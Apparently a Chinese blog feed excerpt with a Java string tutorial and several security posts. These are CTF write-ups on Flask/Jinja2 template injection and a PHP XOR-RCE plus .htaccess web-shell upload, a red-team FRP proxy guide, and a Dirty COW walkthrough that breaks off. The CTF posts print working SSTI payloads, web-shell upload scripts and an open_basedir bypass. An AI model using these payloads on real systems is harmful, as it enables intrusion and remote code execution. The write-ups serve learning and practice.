src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922153526437.png" alt="image-20220922153526437"></p><h2 id="字符串的拼接"><a href="#字符串的拼接" class="headerlink" title="字符串的拼接"></a>字符串的拼接</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922172731643.png" alt="image-20220922172731643"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922172901733.png" alt="image-20220922172901733"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922173113725.png" alt="image-20220922173113725"></p><p><strong>jdk7以后，调用intern方法时，如果该字符串已经存在于常量池中，则将常量池中的引用直接返回；如果不存在，则在常量池中生成一个对原字符串的引用。</strong></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922173746272.png" alt="image-20220922173746272"></p><h2 id="字符串常用方法一"><a href="#字符串常用方法一" class="headerlink" title="字符串常用方法一"></a>字符串常用方法一</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922212123884.png" alt="image-20220922212123884"></p><h2 id="字符串常用方法二"><a href="#字符串常用方法二" class="headerlink" title="字符串常用方法二"></a>字符串常用方法二</h2><pre><code class="java">public class TestSrting &#123;    public static void main(String[] args) &#123;        String message = &quot;hello word!&quot;;        //contain 判断是否包含指定字符串        boolean flag1 = message.contains(&quot;he&quot;);        boolean flag2 = message.contains(&quot;he11&quot;);        System.out.println(&quot;flag1 = &quot; + flag1);        System.out.println(&quot;flag2 = &quot; + flag2);        //indexOf 查找指定元素第一次出现得下标，从0开始 不存在返回-1        int res1 = message.indexOf(&quot;l&quot;);        int res2 = message.indexOf(&quot;o&quot;);        System.out.println(&quot;res1 = &quot; + res1);        System.out.println(&quot;res2 = &quot; + res2);        //lastIndexOf 查找指定元素最后一次出现的位置 不存在返回-1        int res3 = message.lastIndexOf(&quot;l&quot;);        System.out.println(&quot;res3 = &quot; + res3);        //截取字符串        String s1 = message.substring(6); //从第六个字符开始截取，包括第六个字符        System.out.println(&quot;s1 = &quot; + s1);        String s2 = message.substring(0,5); //截取第1个道第五个字符，左闭右开        System.out.println(&quot;s2 = &quot; + s2);        //获取指定位置字符串        char c =message.charAt(message.length()-1);        System.out.println(&quot;c = &quot; + c);        //将字符串转化为char数组        char [] chars = message.toCharArray();        System.out.println(Arrays.toString(chars));    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922214732176.png" alt="image-20220922214732176"></p><h2 id="字符串常用方法三"><a href="#字符串常用方法三" class="headerlink" title="字符串常用方法三"></a>字符串常用方法三</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922215134780.png" alt="image-20220922215134780"></p><pre><code class="java">public class TestString2 &#123;    public static void main(String[] args) throws UnsupportedEncodingException &#123;        String message = &quot;你好世界&quot;;        byte [] bytes = message.getBytes();        System.out.println(&quot;Arrays.toString(bytes) = &quot; + Arrays.toString(bytes));        byte [] messBytes = message.getBytes(&quot;iso8859-1&quot;); //这是统一标准        System.out.println(Arrays.toString(messBytes));        System.out.println(message.getBytes(&quot;gbk&quot;).length); //国标 一个汉字等于两个字节        System.out.println(message.getBytes(&quot;utf-8&quot;).length); //一个汉字等于三个字节    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922221107346-16638558691005.png" alt="image-20220922221107346"></p><p><strong>starts with和ends with、正则表达式、replace函数、split函数</strong></p><pre><code class="java">public class TestString2 &#123;    public static void main(String[] args) throws UnsupportedEncodingException &#123;        //判断以什么开头和以什么结尾        String message = &quot;I really want to stat at your house&quot;;        boolean flag1 = message.startsWith(&quot;I&quot;);        System.out.println(&quot;flag1 = &quot; + flag1);        boolean flag2 = message.endsWith(&quot;house&quot;);        System.out.println(&quot;flag2 = &quot; + flag2);        //replace函数，替换第一个字符        String rpmessage = message.replace(&quot;stat at your house&quot;,&quot;love you&quot;);        System.out.println(&quot;rpmessage = &quot; + rpmessage);        //replaceall函数，替换所有字符,第一个参数可用正则进行匹配        String message2 = &quot;wo wo wo love you&quot;;        String rpmessage2 = message2.replaceAll(&quot;wo&quot;,&quot;I&quot;);        System.out.println(&quot;rpmessage2 = &quot; + rpmessage2);        //split函数分割字符串 可用正则匹配        String s1 = &quot;Fly1to1the1moon&quot;;        String [] strings = s1.split(&quot;1&quot;);        System.out.println(Arrays.toString(strings));        //正则表达式进行匹配        /*        []:代表一个字符        [a-z]:小写字母[a-z]任何一个都可以        +: 一个或多个        *: 0个或多个        [^a]:代表匹配不是a的数据        ^ :代表以什么开始        $ : 代表以什么结尾        \d：代表任意一个数字 0-9        \w 代表数字字母和下划线         */        String s2 = &quot;b&quot;;        boolean matchs = s2.matches(&quot;[^a]&quot;);        System.out.println(&quot;matchs = &quot; + matchs);    &#125;&#125;</code></pre><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20220922225821274.png" alt="image-20220922225821274"></p><h1 id="day18"><a href="#day18" class="headerlink" title="day18"></a>day18</h1><h2 id="StringBuilder与StringBuffer"><a href="#StringBuilder与StringBuffer" class="headerlink" title="StringBuilder与StringBuffer"></a>StringBuilder与StringBuffer</h2><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20221004210916260.png" alt="image-20221004210916260"></p><p><img src="/2022/02/11/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%97%85/image-20221004211139017.png" alt="image-20221004211139017"></p><h2 id="StringBuffer常用方法"><a href="#StringBuffer常用方法" class="headerlink" title="StringBuffer常用方法"></a>StringBuffer常用方法</h2>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019 I_&lt;3_Flask 0x70-0x7F</title>
      <link href="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/"/>
      <url>/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/</url>
      
        <content type="html"><![CDATA[<h1 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h1><p>这道题是模板注入。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102608147.png" alt="image-20220211102608147"></p><p>首先查看源代码，并没有什么用。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102910418.png" alt="image-20220211102910418"></p><p>dirsearch爆破一下，什么也没有。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211102929099.png" alt="image-20220211102929099"></p><p>本题是flask类题目，ctf常考点不过就是模板注入，所以我们需要寻找可注入参数，本地并没有给出，需要我们自己去爆破。</p><p>我们这里采用arjun工具进行爆破。工具链接：<a href="https://github.com/s0md3v/Arjun">https://github.com/s0md3v/Arjun</a></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110028885.png" alt="image-20220211110028885">最终可爆破出来参数name。</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105238512.png" alt="image-20220211105238512"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211105250064.png" alt="image-20220211105250064"></p><p>测试了一下的确存在模板注入。</p><p>接下来就是对漏洞的利用。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="工具tplmap"><a href="#工具tplmap" class="headerlink" title="工具tplmap"></a>工具tplmap</h2><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110242684.png" alt="image-20220211110242684"></p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110254561.png" alt="image-20220211110254561"></p><p>成功，发现为Jinja2模板，在ctf题目中经常考察</p><p>直接–os-shell拿下shell，读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211110436293.png" alt="image-20220211110436293"></p><h2 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h2><p>只会工具当然不行，有时候工具无法成功，就需要自己手动测试，所以如何手撸也是需要掌握的。</p><p>具体可参考这篇文章，东西很多且杂，写给自己看的大佬别喷我。</p><p><a href="https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/">https://sakurahack-y.github.io/2021/10/15/ssti-flak%E6%A1%86%E6%9E%B6/</a></p><p>首先给几个比较通用的payload</p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in ().__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('whoami').read()") &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111654284.png" alt="image-20220211111654284"></p><pre><code>http://b8ef4c5f-f8bd-40de-acd4-c17dec6fb0d6.node4.buuoj.cn:81/?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == 'catch_warnings' %&#125;  &#123;% for b in c.__init__.__globals__.values() %&#125;  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;    &#123;% if 'eval' in b.keys() %&#125;      &#123;&#123; b['eval']('__import__("os").popen("whoami").read()') &#125;&#125;    &#123;% endif %&#125;  &#123;% endif %&#125;  &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</code></pre><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211111724780.png" alt="image-20220211111724780"></p><p>然后我们再讲一讲自己如何撸出来一个payload，做法就是寻找可利用的类。</p><p>1、有popen()的类</p><pre><code>os._wrap_closepayload:&#123;&#123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>2、有os模块的</p><p>socket._socketobject（一般在71）、site._Printer等模块</p><pre><code>payload:&#123;&#123;[].__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen(cat /xxx/flag)&#125;&#125;</code></pre><p>3、有builtins的类</p><p>__ builtins __代码执行（最常用的方法）</p><p>warnings.catch_warnings含有,常用的还有email.header._ValueFormatter</p><p>__ builtins __  是一个包含了大量内置函数的一个模块，我们平时用python的时候之所以可以直接使用一些函数比如abs，max，就是因为__ builtins  __ 这类模块在Python启动时为我们导入了，可以使用dir(__ builtins __ )来查看调用方法的列表，然后可以发现__  builtins __ 下有eval，__ import __等的函数，因此可以利用此来执行命令。</p><p>好了，接下来进行实践。</p><p>我们把所有子类列出来</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112131255.png" alt="image-20220211112131255"></p><p>好家伙出来了很多啊，我们只需要找到我们需要的就好，我们用python脚本跑一下</p><pre><code class="python">import jsona = &quot;&quot;&quot;&lt;class &#39;type&#39;&gt;,...,&lt;class &#39;subprocess.Popen&#39;&gt;&quot;&quot;&quot;num = 0allList = []result = &quot;&quot;for i in a:    if i == &quot;&gt;&quot;:        result += i        allList.append(result)        result = &quot;&quot;    elif i == &quot;\n&quot; or i == &quot;,&quot;:        continue    else:        result += i        for k,v in enumerate(allList):    if &quot;os._wrap_close&quot; in v:        print(str(k)+&quot;---&gt;&quot;+v)</code></pre><p>我们先来找下os._wrap_close</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112532522.png" alt="image-20220211112532522"></p><p>已经出来了在132位，那么我们就可以构造一个payload</p><pre><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('whoami').read()&#125;&#125;</code></pre><p>我们来测试一下是否可以</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112709595.png" alt="image-20220211112709595"></p><p>成功列出来了文件。</p><p>直接读取flag</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112747491.png" alt="image-20220211112747491"></p><p>同理，可以利用的类还有很多啊，</p><p><img src="/2022/02/11/RootersCTF2019-I-3-Flask-0x70-0x7F/image-20220211112931751.png" alt="image-20220211112931751"></p><p>就像这个类也在里面包含着，我们同样可以利用它来获取flag。</p><p>方法有很多，理解原理并掌握其中几种方法即可。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF 2019 EasyWeb_0x61-0x6F</title>
      <link href="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/"/>
      <url>/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/</url>
      
        <content type="html"><![CDATA[<p>呜呜呜，我这条懒狗好长时间没刷题了，后面的日子要捡起来了。</p><p>源码贴上来：</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150538110.png" alt="image-20220210150538110"></p><p>代码其实可以分为两部分，第一部分是文件上传，第二部分是rce。</p><p>我们先来尝试一下rce，好家伙，过滤了很多东西啊。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150849473.png" alt="image-20220210150849473"></p><p>由此判断，这是无字母无数字rce，有三个思路</p><p>1、异或</p><p>2、取反</p><p>3、自增</p><p>由于这里对字符的长度有限制</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210150949879.png" alt="image-20220210150949879"></p><p>故采用异或。</p><p>这里贴上大神的脚本</p><pre><code class="php">&lt;?phpfunction finds($string)&#123;    $index = 0;    $a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];    for($i=27;$i&lt;count($a);$i++)&#123;        for($j=27;$j&lt;count($a);$j++)&#123;            $x = $a[$i] ^ $a[$j];            for($k = 0;$k&lt;strlen($string);$k++)&#123;                if(ord($string[$k]) == $x)&#123;                    echo $string[$k].&quot;\n&quot;;                    echo &#39;%&#39; . dechex($a[$i]) . &#39;^%&#39; . dechex($a[$j]).&quot;\n&quot;;                    $index++;                    if($index == strlen($string))&#123;                        return 0;                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;finds(&quot;_GET&quot;);?&gt;</code></pre><p>运行如图</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210151113658.png" alt="image-20220210151113658"></p><p>由此我们可构造payload：</p><pre><code>http://127.0.0.1?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152555350.png" alt="image-20220210152555350"></p><p>成功出来phpinfo，看一看有没有可以利用的点</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152650640.png" alt="image-20220210152650640"></p><p>发现执行系统的命令全被禁用了，看来rce走不通了。</p><p>这里顺带提一嘴，在buu的环境中存在非预期解，flag直接在phpinfo里了</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152821670.png" alt="image-20220210152821670"></p><p>不过还是按照做题的套路来吧，真正的比赛应该不会出现这种情况。</p><p>既然rce走不通，那就试一试文件上传吧</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210152933281.png" alt="image-20220210152933281"></p><p>各种限制非常多，这里限制了上传php后缀的文件，所以要想办法绕过，最先想到的就算.htaccess解析。</p><p>但是上传.htaccess仍然有<img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210204915083.png" alt="image-20220210204915083"></p><p>这个函数限制。</p><p>解决这个函数，采用xbm格式，X Bit Map</p><pre><code>在计算机图形学中，X Window系统使用X BitMap（XBM），一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图XBM数据由一系列包含单色像素数据的静态无符号字符数组组成。当格式被普遍使用时，XBM通常出现在标题（.h文件）中，每个图像在标题中存储一个数组。以下C代码示例了一个XBM文件：</code></pre><pre><code>#define test_width 16#define test_height 7static char test_bits[] = &#123;0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,0x00, 0x60 &#125;;</code></pre><p>在这个c文件中高和宽都是有#在前面的，那么我们即使把它放在.htaccess文件中也不会影响.htaccess的实际运行效果。</p><p>所以我们在.htaccess里加上</p><pre><code>#define width 1337#define height 1337..........</code></pre><p>就可以绕过绕过这个函数了。</p><p>上传.htaccess文件后，要上传一个非php后缀的一句话木马，但本题中仍然对&lt;?进行了检测。</p><p>这里有两种方法可以绕过。</p><p>1、对一句话木马的内容进行base64编码。</p><p>2、使用 utf-16be 来绕过</p><p>下面先附上两种方法的exp：</p><p>1、</p><pre><code class="python">import requestsimport base64htaccess = b&quot;&quot;&quot;#define width 1337#define height 1337 AddType application/x-httpd-php .ahhhphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.ahhh&quot;&quot;&quot;&quot;shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;)#这里的GIF8912后面的12是为了符合base64 8个字节的编码规范url = &quot;http://95670a2d-e895-4364-bb7b-94939098a4b6.node3.buuoj.cn/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;files = &#123;&#39;file&#39;:(&#39;.htaccess&#39;,htaccess,&#39;image/jpeg&#39;)&#125;data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;response = requests.post(url=url, data=data, files=files)print(response.text)files = &#123;&#39;file&#39;:(&#39;shell.ahhh&#39;,shell,&#39;image/jpeg&#39;)&#125;response = requests.post(url=url, data=data, files=files)print(response.text)</code></pre><p>本题php环境为7.2，所以无法使用<code>&lt;script language=&#39;php&#39;&gt;eval($_REQUEST[&#39;shell&#39;]);&lt;/script&gt;</code>这条payload,所以将shell.ha进行base64编码之后，在.htaccess文件中利用filter://协议将文件解码，从而达到传入shell的目的。</p><p>得到</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212049717.png" alt="image-20220210212049717"></p><p>2、</p><pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;def generate_php_file(filename, script):    phpfile = open(filename, &#39;wb&#39;)     phpfile.write(script.encode(&#39;utf-16be&#39;))    phpfile.write(SIZE_HEADER)    phpfile.close()def generate_htacess():    htaccess = open(&#39;.htaccess&#39;, &#39;wb&#39;)    htaccess.write(SIZE_HEADER)    htaccess.write(b&#39;AddType application/x-httpd-php .lethe\n&#39;)    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)    htaccess.write(b&#39;php_value display_errors 1\n&#39;)    htaccess.close()        generate_htacess()generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)</code></pre><p>同理上传即可</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212639842.png" alt="image-20220210212639842"></p><p>一句话木马成功利用。</p><p>使用蚁剑成功连接</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210212824536.png" alt="image-20220210212824536"></p><p>但是无法访问根目录。</p><p>非预期解：</p><p>采用蚁剑自带插件进行绕过.</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210213427872.png" alt="image-20220210213427872"></p><p>预期解：</p><p>绕过open_basedir</p><p>这里由于涉及的内容我还不太理解，所以这里直接放出payload，有兴趣的大佬可以深入研究一下。</p><pre><code>chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></pre><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214135619.png" alt="image-20220210214135619"></p><p>所有文件被列举出来了，下面读取flag值就可以了。</p><p><img src="/2022/02/10/SUCTF-2019-EasyWeb-0x61-0x6F/image-20220210214447849.png" alt="image-20220210214447849"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向代理之FRP</title>
      <link href="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/"/>
      <url>/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/</url>
      
        <content type="html"><![CDATA[<p>Frp工具：开源免费，自行搭建，方便修改，成本低，使用多样化，防止隐私泄露。</p><p>工具链接：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p><p>作用:当本机和目标机处于不同内网，借用代理来实现用本机进行内网攻击。</p><p>环境：</p><p>kali2021(本机)  内网ip:192.168.64.128</p><p>centos7.5(服务器) </p><p>windows server 2008 R2 ×64 (目标机)  内网ip:192.168.1.9</p><p>为什么要使用代理?</p><p>两个不同的内网的主机想要通过CS或者MSF等工具实现控制或者通讯是不可能的，必须要借助代理.</p><p>个人认为其根本原因就只有一点：没有独立且确定的公网ip</p><p>如果控制端是外网主机，被控端是内网主机，就相当于控制端有一个唯一的IP地址（比如103.12.4.11），通过这个IP地址就可以找到控制端，而在内网的被控端（比如192.168.23.36），你通过控制端主动去找是找不到的，因为这个内网IP地址并不是唯一的，可能很多内网都用了这个IP地址，你根本没法找。此时就需要反向连接了，让内网的被控端主动去找外网的控制端。而本机和目标机都处于内网之中，此时必须使用代理来进行连接。</p><p>首先配置好环境，kali与win2008处于不同网段，且都可联网。(vm中自行配置，可将一台主机至于NAT模式，一台置于仅主机，使仅主机可联网)</p><p>检测kali的内网ip和网络</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155315218.png" alt="image-20220119155315218"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155341286.png" alt="image-20220119155341286"></p><p>检测win2008的内网ip和网络.</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155431599.png" alt="image-20220119155431599"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155453758.png" alt="image-20220119155453758"></p><p>下载frp到kali中</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119155729846.png" alt="image-20220119155729846"></p><p>frpc.ini配置文件是服务端，frpc.ini是客户端，下面进行配置。</p><p>我们首先打开我们的服务器，编辑frps.ini</p><p>随意设置一个端口号就好。</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119162501013.png" alt="image-20220119162501013"></p><p>启动服务端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119163847158.png" alt="image-20220119163847158"></p><p>接下来在kali中配置控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164721460.png" alt="image-20220119164721460"></p><p>启动控制端</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119164937708.png" alt="image-20220119164937708"></p><p>接下来利用msfvenom生成木马开启监听</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171131305.png" alt="image-20220119171131305"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171505986.png" alt="image-20220119171505986"></p><p>将木马上线</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119171914965.png" alt="image-20220119171914965"></p><p>监听到会话</p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173926936.png" alt="image-20220119173926936"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119173948480.png" alt="image-20220119173948480"></p><p><img src="/2022/01/17/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E4%BB%A3%E7%90%86%E4%B9%8BFRP/image-20220119174002938.png" alt="image-20220119174002938"></p><p>成功实现了内网代理。</p>]]></content>
      
      
      <categories>
          
          <category> 红队 </category>
          
          <category> 代理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux脏牛提权</title>
      <link href="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/"/>
      <url>/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p>脏牛漏洞，又叫Dirty COW，存在Linux内核中已经有长达9年的时间，在2007年发布的Linux内核版本中就已经存在此漏洞。Linux kernel团队在2016年10月18日已经对此进行了修复。</p><p>漏洞范围：Linux内核 &gt;= 2.6.22（2007年发行，到2016年10月18日才修复）</p><p>简要分析：该漏洞具体为，Linux内核的内存子系统在处理写入复制（copy-on-write, COW）时产生了竞争条件（race condition）。恶意用户可利用此漏洞，来获取高权限，对只读内存映射进行写访问。竞争条件，指的是任务执行顺序异常，可导致应用崩溃，或令攻击者有机可乘，进一步执行其他代码。利用这一漏洞，攻击者可在其目标系统提升权限，甚至可能获得root权限。</p><p>复现：</p><p>环境：Ubuntu 14.04.5</p><p>靶场下载地址:<a href="https://www.vulnhub.com/entry/lampiao-1,249/">Lampião: 1 ~ VulnHub</a></p><p>开启kali，靶机，配置使其位于同一网段</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144958930.png" alt="image-20220104144958930"></p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144854766.png" alt="image-20220104144854766"></p><p>使用nmap对ip段进行扫描</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104144833775.png" alt="image-20220104144833775"></p><p>发现可疑ip  192.168.64.129</p><p>打开</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145052541.png" alt="image-20220104145052541"></p><p>没有发现有用信息，对其端口进行进一步探测</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145423615.png" alt="image-20220104145423615"></p><p>发现 1898端口</p><p>打开，网页如图</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145547619.png" alt="image-20220104145547619"></p><p>在底部发现cms为Drupal</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104145621761.png" alt="image-20220104145621761"></p><p>探测其版本为 Drupal7</p><p><img src="/2022/01/04/Linux%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83/image-20220104150839353.png" alt="image-20220104150839353"></p><p>百度一下，发现其存在 远程代码执行漏洞 CVE-2018-7600</p><p>打开msf搜索相关漏洞</p><p><img 